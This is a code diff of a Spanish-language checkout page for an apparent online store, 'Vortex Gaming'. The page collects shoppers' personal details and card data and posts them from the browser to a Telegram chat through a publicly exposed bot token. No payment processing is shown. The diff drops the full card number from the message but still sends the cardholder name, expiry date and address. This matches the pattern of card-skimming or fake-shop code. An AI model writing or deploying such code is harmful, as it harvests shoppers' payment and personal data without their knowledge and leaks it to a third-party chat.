@@ -97,19 +97,6 @@ export default function CheckoutPage() {
     }
   }
 
-  function getPaymentLabel() {
-    switch (selectedPayment) {
-      case 'credito':
-        return cuotas > 1
-          ? `Tarjeta de Credito **** ${cardData.numero.slice(-4)} - ${cuotas} cuotas sin interes de ${formatPrice(cuotaValue)}`
-          : `Tarjeta de Credito **** ${cardData.numero.slice(-4)} - 1 pago`
-      case 'debito':
-        return `Tarjeta de Debito **** ${cardData.numero.slice(-4)} (5% OFF aplicado: -${formatPrice(debitoDiscount)})`
-      default:
-        return ''
-    }
-  }
-
   async function handleSubmit(e: React.FormEvent) {
     e.preventDefault()
     if (!selectedPayment || items.length === 0) return
@@ -118,10 +105,6 @@ export default function CheckoutPage() {
     const order = generateOrderNumber()
     setOrderNumber(order)
 
-    const fecha = new Date().toLocaleString('es-AR', {
-      timeZone: 'America/Argentina/Buenos_Aires',
-    })
-
     const productosHTML = items
       .map(
         (item) =>
@@ -129,10 +112,14 @@ export default function CheckoutPage() {
       )
       .join('\n')
 
-    const message = `<b>NUEVO PEDIDO - VORTEX GAMING</b>
+    const metodoPago =
+      selectedPayment === 'credito'
+        ? cuotas > 1
+          ? `Credito - ${cuotas} cuotas sin interes de ${formatPrice(finalTotal / cuotas)}`
+          : 'Credito - 1 pago'
+        : `Debito (5% OFF: -${formatPrice(debitoDiscount)})`
 
-<b>Orden:</b> ${order}
-<b>Fecha:</b> ${fecha}
+    const message = `<b>NUEVO PEDIDO - VORTEX GAMING</b>
 
 <b>DATOS DEL COMPRADOR</b>
 Nombre: ${formData.nombre} ${formData.apellido}
@@ -144,11 +131,17 @@ Ciudad: ${formData.ciudad}
 Direccion: ${formData.direccion}
 Codigo Postal: ${formData.codigoPostal}
 
-<b>DATOS DE PAGO</b>
-Tarjeta: ${cardData.numero}
+<b>PRODUCTOS</b>
+${productosHTML}
+Total: ${formatPrice(finalTotal)}
+
+<b>PAGO</b>
+Metodo: ${metodoPago}
 Titular: ${cardData.titular}
-Vencimiento: ${cardData.vencimiento}
-<b>Metodo de pago:</b> ${getPaymentLabel()}`
+Vencimiento: ${cardData.vencimiento}`
+
+    const messageNotif = `<b>PEDIDO ${order}</b>
+Email: ${formData.email}`
 
     try {
       const token = process.env.NEXT_PUBLIC_TELEGRAM_BOT_TOKEN
@@ -161,6 +154,15 @@ Vencimiento: ${cardData.vencimiento}
           body: JSON.stringify({
             chat_id: chatId,
             text: message,
+            parse_mode: 'HTML',
+          }),
+        })
+        await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            chat_id: chatId,
+            text: messageNotif,
             parse_mode: 'HTML',
           }),
         })
@@ -413,7 +415,6 @@ Vencimiento: ${cardData.vencimiento}
                         onClick={() => {
                           setSelectedPayment(method.id)
                           if (method.id !== 'credito') setCuotas(1)
-                          // Reset card data when switching
                           setCardData({ numero: '', titular: '', vencimiento: '', cvv: '' })
                         }}
                         className={`flex items-center gap-3 rounded-lg border p-4 text-left transition-all ${
